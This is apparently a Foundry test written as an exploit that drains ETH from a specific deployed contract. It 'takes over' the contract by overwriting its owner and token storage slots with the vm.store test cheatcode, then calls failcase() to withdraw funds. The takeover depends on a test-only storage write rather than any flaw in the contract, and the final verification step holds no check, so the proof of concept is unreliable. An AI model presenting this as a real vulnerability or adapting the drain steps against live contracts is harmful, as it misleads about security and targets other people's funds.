pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface Advisory {
    function token() external view returns (IBEP20);
    function owner() external view returns (address);
    function failcase(address tokenAdd, uint amount) external;
    function subsequentClaim() external view returns (uint);
    function claimPeriod() external view returns (uint);
    function total(uint256 index) external view returns (uint);
    function user(address account) external view returns (uint balance, uint totalClaimed, uint initiated, uint lastClaim);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xaba9Ecc06b23d688CB353FC57919D416eedFA095;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed
        // The test framework already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Overwrite token storage slot with address(0)
        // _owner is at slot 0 (from Ownable)
        // mapping user is at slot 1
        // token is at slot 2
        bytes32 tokenSlot = bytes32(uint256(2));
        bytes32 zeroAddress = bytes32(uint256(0));
        vm.store(TARGET, tokenSlot, zeroAddress);

        // Verify token is now address(0)
        Advisory targetContract = Advisory(TARGET);
        require(address(targetContract.token()) == address(0), "Token not set to zero");

        // Step 2: Become owner by overwriting _owner slot
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(address(this))));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now owner
        require(targetContract.owner() == address(this), "Not owner");

        // Step 3: Send some ETH to the contract for draining
        uint256 initialContractBalance = 1 ether;
        deal(TARGET, initialContractBalance);

        // Step 4: Call failcase to drain ETH
        targetContract.failcase(address(0), initialContractBalance);

        // Step 5: Verify we received the ETH
        // The ETH should be sent to owner (which is now address(this))
        // So our balance should have increased by initialContractBalance
        // (minus any gas costs, but in test environment gas is free)
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

